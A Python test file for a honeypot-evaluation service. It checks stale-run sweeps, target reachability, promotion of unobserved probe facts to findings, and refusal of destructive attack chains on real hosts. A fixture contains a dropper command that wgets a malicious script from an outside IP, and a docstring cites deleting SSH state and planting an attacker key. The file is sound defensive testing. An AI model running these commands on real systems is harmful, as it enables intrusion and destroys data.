def _command_hit(event_id: str, command: str, session_id: str) -> dict:
    return {
        "_id": event_id,
        "_source": {
            "@timestamp": "2026-09-08T10:00:00.000Z",
            "process": {"command_line": command},
            "source": {"ip": "172.19.0.1", "port": 51234},
            "session": {"id": session_id},
        },
    }


def _stub_session(target):
    class _Session:
        # Shaped like the real agent session: the chain runner reads the nonce
        # off it to find the honeypot-side session id.
        marker = "__hm_stub__"

    @asynccontextmanager
    async def _open():
        yield _Session()

    return _open()


async def _stub_execute(session, command):
    return "", 0


def _stub_modules(monkeypatch) -> None:
    """Replace every subprocess/SSH boundary with a deterministic stub."""
    observation = Observation(
        probe_id="uname", establishes="os.identity", value="Linux", fact_status="observed"
    )
    outcome = ModuleOutcome(
        module="agent", module_status="completed", observations=[observation]
    )

    async def _agent(*args, **kwargs):
        return outcome

    async def _nmap(*args, **kwargs):
        return ModuleOutcome(module="nmap", module_status="completed", observations=[])

    async def _chains(*args, **kwargs):
        return []

    async def _noop(*args, **kwargs):
        return None

    monkeypatch.setattr(runs, "_run_agent", _agent)
    monkeypatch.setattr(runs, "_run_nmap", _nmap)
    monkeypatch.setattr(runs, "_run_chains", _chains)
    monkeypatch.setattr(runs, "_reset_target", _noop)
    # Reachability is an SSH boundary like the rest: `evaluation_target_host`
    # defaults to the compose service name, which does not resolve from a
    # test process on the host, so leaving this real would make every run
    # here wait out a connection that was never going to succeed.
    monkeypatch.setattr(runs, "_assert_target_reachable", _noop)
    monkeypatch.setattr(runs, "_honeypot_fingerprint", _fixed("sha256:BASE"))
    monkeypatch.setattr(runs, "_capture", null_capture)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)


@pytest.mark.asyncio
async def test_the_startup_sweep_clears_a_fresh_row_the_in_run_sweep_must_not(started) -> None:
    """Both halves, or the distinction between the two sweeps is untested.

    The advisory lock a killed process held is already gone -- Postgres drops
    session locks when the connection dies -- but its row still says `running`.
    The age-based sweep cannot clear it, because at any other moment a row that
    young might belong to a live run in another process, and terminating that
    row underneath it would lose the run it is about to persist. So the next
    POST for that honeypot takes the lock, reads `is_running` True, and is
    refused with "an evaluation is already running" -- which is false -- for
    the full 45-minute cutoff.

    At startup that reasoning does not apply: no run of a process that has
    only just begun can be live, so every RUNNING row is an orphan whatever
    its age. Hence two entry points and not a lowered cutoff.
    """
    honeypot = "cowrie-startup-sweep-test"
    run_id = uuid.uuid4()
    started.track(run_id)
    # A process killed two minutes into a run: far too recent for the cutoff.
    killed_at = datetime.now(timezone.utc) - timedelta(minutes=2)
    async with get_session_factory()() as db:
        db.add(
            EvaluationRun(
                id=run_id,
                honeypot_id=honeypot,
                status="running",
                started_at=killed_at,
                agent_model="deterministic-probes@1",
                evaluator_status="unavailable",
                honeypot_fingerprint="sha256:BASE",
                evaluation_config_fingerprint="sha256:CFG",
            )
        )
        await db.commit()

    # Half one: the sweep `start_run` makes leaves it alone, because a row
    # this young could belong to a live run in another process.
    assert await runs.reconcile_stale_runs(honeypot) == []
    assert await runs.is_running(honeypot) is True

    # Half two: the startup sweep clears it, age notwithstanding.
    assert run_id in await runs.reconcile_orphaned_runs_at_startup()
    assert await runs.is_running(honeypot) is False

    run = await runs.load_run(run_id)
    assert run.status == "failed"
    assert run.finished_at is not None
    # FAILED with no explanation would be a worse artefact than the lockout,
    # and the explanation must be the startup one, not the age-based one.
    orchestrator = next(m for m in run.modules if m.module == "orchestrator")
    assert "reconciled as failed" in orchestrator.detail
    assert "when this process started" in orchestrator.detail


@pytest.mark.asyncio
async def test_the_startup_sweep_does_not_disturb_a_finished_run(started) -> None:
    """Sweeping every age must not mean sweeping every row."""
    honeypot = "cowrie-startup-sweep-untouched"
    run_id = uuid.uuid4()
    started.track(run_id)
    now = datetime.now(timezone.utc)
    async with get_session_factory()() as db:
        db.add(
            EvaluationRun(
                id=run_id,
                honeypot_id=honeypot,
                status="completed",
                started_at=now,
                finished_at=now,
                agent_model="deterministic-probes@1",
                evaluator_status="unavailable",
                honeypot_fingerprint="sha256:BASE",
                evaluation_config_fingerprint="sha256:CFG",
            )
        )
        await db.commit()

    assert run_id not in await runs.reconcile_orphaned_runs_at_startup()
    run = await runs.load_run(run_id)
    assert run.status == "completed"


async def _accept_and_hold(reader, writer) -> None:
    """Accept the connection and hold it, the way a real SSH server does.

    A handler that closed immediately would hide the bug this pair of tests
    found: the reachability check awaited `wait_closed()`, which waits on the
    PEER, so a target that politely keeps the socket open hung the check
    forever.
    """
    try:
        await reader.read(1)
    finally:
        writer.close()


# ---------------------------------------------------------------------------
# Target reachability. `evaluation_target_host` defaults to the compose
# service name `cowrie`, which does not resolve from a backend running on the
# host -- the single most common misconfiguration in this project.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_an_unreachable_target_aborts_before_the_honeypot_is_reset(
    monkeypatch,
) -> None:
    """Reachability is checked FIRST, ahead of the reset.

    Order matters here, and not only for the error message. The reset clears
    the state a previous evaluation left behind. Running it and then
    discovering the target was never reachable destroys the previous run's
    residue to produce nothing -- so the cheap check that costs a TCP connect
    goes before the one with a side effect.
    """
    _stub_modules(monkeypatch)
    reset_calls: list = []

    async def _spy_reset(*args, **kwargs):
        reset_calls.append(args)

    async def _unreachable(*args, **kwargs):
        raise runs.TargetUnreachableError("cowrie:2222 refused the connection")

    monkeypatch.setattr(runs, "_reset_target", _spy_reset)
    monkeypatch.setattr(runs, "_assert_target_reachable", _unreachable)

    before = await _run_count()
    with pytest.raises(runs.TargetUnreachableError):
        await runs.start_run("cowrie-01")

    assert await _run_count() == before, "a run row survived an unreachable target"
    assert reset_calls == [], "the honeypot was reset for a run that could never start"


@pytest.mark.asyncio
async def test_reachability_accepts_a_listening_port() -> None:
    """The check is a TCP connect, not an SSH handshake.

    Anything that accepts the connection passes. Deciding whether what
    answered is really a honeypot is the agent's job, and the fingerprint's;
    making this a protocol check would duplicate both and add a second thing
    to keep in step with Cowrie.
    """
    server = await asyncio.start_server(_accept_and_hold, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    try:
        await runs._assert_target_reachable(
            runs.EvaluationTarget(host="127.0.0.1", port=port, username="root", password="x")
        )
    finally:
        server.close()
        await server.wait_closed()


@pytest.mark.asyncio
async def test_reachability_names_the_setting_that_is_wrong() -> None:
    """The message has to be actionable without reading the source.

    A bare ConnectionRefusedError two minutes into a run, after every probe
    has timed out and every fact has degraded to unknown, is technically
    accurate and practically useless.
    """
    server = await asyncio.start_server(_accept_and_hold, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    server.close()
    await server.wait_closed()  # the port is now certainly closed

    with pytest.raises(runs.TargetUnreachableError) as caught:
        await runs._assert_target_reachable(
            runs.EvaluationTarget(host="127.0.0.1", port=port, username="root", password="x"),
            timeout_seconds=1.0,
        )

    message = str(caught.value)
    assert "EVALUATION_TARGET_HOST" in message
    assert str(port) in message


# ---------------------------------------------------------------------------
# Promoting negative facts into findings.
#
# The facts were already collected, scored and evidence-backed; they were
# simply never expressed as findings. Without them a run on the normal
# no-BYOK configuration produces nothing for a lifecycle to track.
# ---------------------------------------------------------------------------


def _collected_with(probe_rows=(), chain_rows=(), characteristics=None):
    collected = runs._Collected()
    collected.probe_rows.extend(probe_rows)
    collected.chain_rows.extend(chain_rows)
    for row in probe_rows:
        collected.characteristic_by_probe_row[row.id] = (characteristics or {}).get(
            row.probe_id, "basic_commands"
        )
    return collected


def _probe_row(run_id, probe_id, establishes, fact_status, module="agent"):
    return EvaluationProbeResult(
        run_id=run_id,
        module=module,
        probe_id=probe_id,
        target="cowrie",
        establishes=establishes,
        value=None,
        fact_status=fact_status,
        raw_output=None,
    )


def test_a_not_observed_probe_becomes_a_finding_with_its_probe_as_evidence() -> None:
    run_id = uuid.uuid4()
    row = _probe_row(run_id, "os_release", "os.identity", "not_observed")
    collected = _collected_with(probe_rows=[row], characteristics={"os_release": "sanity"})

    runs._fact_findings(run_id, collected)

    assert len(collected.findings) == 1
    pending = collected.findings[0]
    assert pending.finding.finding_key == "probe:os_release:os.identity"
    assert pending.finding.characteristic == "sanity"
    # The evidence trigger rejects an unevidenced finding at COMMIT, so the
    # probe row has to travel with it, not be attached later.
    assert [e.probe_result_id for e in pending.evidence] == [row.id]


def test_an_observed_probe_produces_no_finding() -> None:
    run_id = uuid.uuid4()
    collected = _collected_with(
        probe_rows=[_probe_row(run_id, "uname", "os.identity", "observed")]
    )

    runs._fact_findings(run_id, collected)

    assert collected.findings == []


def test_an_unknown_probe_produces_no_finding() -> None:
    """The rule the whole lifecycle rests on.

    `unknown` means our probe failed, not that the honeypot lacks the thing.
    Turning it into a finding would let an infrastructure failure enter defect
    history -- appearing as a regression on the run it happened, and as a fix
    on the next one.
    """
    run_id = uuid.uuid4()
    collected = _collected_with(
        probe_rows=[_probe_row(run_id, "uname", "os.identity", "unknown")]
    )

    runs._fact_findings(run_id, collected)

    assert collected.findings == []


def test_a_missing_service_is_keyed_as_a_service_not_a_probe() -> None:
    """nmap results land in probe_rows too, so the module is what tells them apart."""
    run_id = uuid.uuid4()
    row = _probe_row(
        run_id, "service.http", "service.http", "not_observed", module="nmap"
    )
    collected = _collected_with(
        probe_rows=[row], characteristics={"service.http": "services"}
    )

    runs._fact_findings(run_id, collected)

    assert collected.findings[0].finding.finding_key == "service:service.http"


def test_a_missing_chain_technique_becomes_a_high_severity_finding() -> None:
    run_id = uuid.uuid4()
    step = EvaluationChainStep(
        run_id=run_id,
        chain_id="dropper",
        step_index=0,
        command="wget http://198.51.100.7/malicious_script.sh",
        cowrie_event_id=None,
        matched_rule_id=None,
        expected_technique_id="T1105",
        fact_status="not_observed",
    )
    collected = _collected_with(chain_rows=[step])

    runs._fact_findings(run_id, collected)

    finding = collected.findings[0]
    assert finding.finding.finding_key == "chain:dropper:T1105"
    assert finding.finding.characteristic == "attack_possibilities"
    # An attack that cannot be carried out is a bigger tell than one absent
    # file, so it does not share the probe severity.
    assert finding.finding.severity == "high"
    assert [e.chain_step_id for e in finding.evidence] == [step.id]


def test_one_key_yields_one_finding_even_if_the_fact_repeats() -> None:
    """The unique index is per (run_id, finding_key), and it rejects at flush.

    Two rows for one probe -- a retry, a duplicated observation -- would take
    the whole run's persistence down with them rather than merely duplicating
    a row.
    """
    run_id = uuid.uuid4()
    rows = [
        _probe_row(run_id, "os_release", "os.identity", "not_observed"),
        _probe_row(run_id, "os_release", "os.identity", "not_observed"),
    ]
    collected = _collected_with(probe_rows=rows)

    runs._fact_findings(run_id, collected)

    assert len(collected.findings) == 1


# ---------------------------------------------------------------------------
# Lifecycle on the comparison. Resolution itself is unit-tested in
# test_evaluation_lifecycle.py; these check the wiring end to end, against
# real runs and the real database.
# ---------------------------------------------------------------------------

_UNAME_KEY = "probe:uname:os.identity"


def _entry(comparison, key):
    return next((f for f in comparison.findings if f.key == key), None)


@pytest.mark.asyncio
async def test_a_defect_present_then_gone_compares_as_fixed(monkeypatch, started) -> None:
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    monkeypatch.setattr(runs, "_run_agent", _agent_returning("not_observed", value=None))
    base = await started()
    monkeypatch.setattr(runs, "_run_agent", _agent_returning("observed"))
    head = await started()

    comparison = await runs.compare_runs(base, head)
    entry = _entry(comparison, _UNAME_KEY)

    assert entry is not None and entry.status == "fixed"
    # There is no row for it in head, so the renderable text and evidence have
    # to come from base or the entry is a bare key nobody can audit.
    assert entry.finding
    assert entry.evidence


@pytest.mark.asyncio
async def test_a_defect_the_next_run_could_not_check_is_not_reported_fixed(
    monkeypatch, started
) -> None:
    """The failure this whole feature was built to avoid."""
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    monkeypatch.setattr(runs, "_run_agent", _agent_returning("not_observed", value=None))
    base = await started()
    monkeypatch.setattr(runs, "_run_agent", _agent_returning("unknown", value=None))
    head = await started()

    entry = _entry(await runs.compare_runs(base, head), _UNAME_KEY)

    assert entry is not None and entry.status == "undetermined"


@pytest.mark.asyncio
async def test_a_persisting_defect_is_reported_from_the_head_run(
    monkeypatch, started
) -> None:
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)
    monkeypatch.setattr(runs, "_run_agent", _agent_returning("not_observed", value=None))

    base = await started()
    head = await started()

    entry = _entry(await runs.compare_runs(base, head), _UNAME_KEY)

    assert entry is not None and entry.status == "persisting"
    assert entry.attributable is True


@pytest.mark.asyncio
async def test_a_changed_evaluation_config_makes_every_status_unattributable(
    monkeypatch, started
) -> None:
    """Same honesty the score delta already carries.

    A probe removed from probes.yaml makes its finding vanish and look
    repaired. The status is still reported -- refusing hides it -- but it is
    marked as not attributable to the honeypot.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)
    monkeypatch.setattr(runs, "_run_agent", _agent_returning("not_observed", value=None))

    base = await started()
    monkeypatch.setattr(
        runs, "_evaluation_config_fingerprint", lambda budget, apparatus: "sha256:CFG2"
    )
    head = await started()

    comparison = await runs.compare_runs(base, head)

    assert "evaluation_config_fingerprint" in comparison.differences
    assert comparison.findings
    assert all(entry.attributable is False for entry in comparison.findings)


# --- A4 + B3: a target that is not Cowrie --------------------------------


@pytest.mark.asyncio
async def test_destructive_chains_are_refused_against_a_non_simulating_target(
    monkeypatch,
) -> None:
    """B3. The chains are only safe because Cowrie emulates every command.

    Against a real host `rm -rf /root/.ssh` deletes the host's SSH state and
    the `echo` installs an attacker-controlled key. Containment stops a
    CALLER choosing the address; it says nothing about what we do once an
    operator has configured one, which is what this closes.
    """

    async def _must_not_open(*args, **kwargs):  # pragma: no cover - asserts absence
        raise AssertionError("an SSH session was opened against a non-simulating target")

    monkeypatch.setattr(chain_runner.agent_module, "_open_session", _must_not_open)

    chain_run = await runs._run_chains(
        runs.EvaluationTarget(
            host="192.0.2.10", port=22, username="root", password="x", kind="generic"
        ),
        "vm-baseline",
    )

    assert chain_run.module_status == "skipped"
    assert chain_run.results == []
    # Every chain fact stays ABSENT rather than not_observed: `verify_chain`
    # hardcodes not_observed on the grounds that the commands were executed,
    # and here they deliberately were not.
    assert "not executed" in chain_run.detail.lower()
    for chain in chain_runner.chains_module.load_chains():
        if chain.destructive:
            assert chain.id in chain_run.detail


@pytest.mark.asyncio
async def test_an_evaluation_target_defaults_to_the_conservative_kind() -> None:
    """A forgotten field must not be what decides whether we destroy a host."""
    target = runs.EvaluationTarget(host="h", port=22, username="root", password="x")

    assert target.kind == "generic"
    assert target.simulates_commands is False
    assert target.has_own_event_log is False
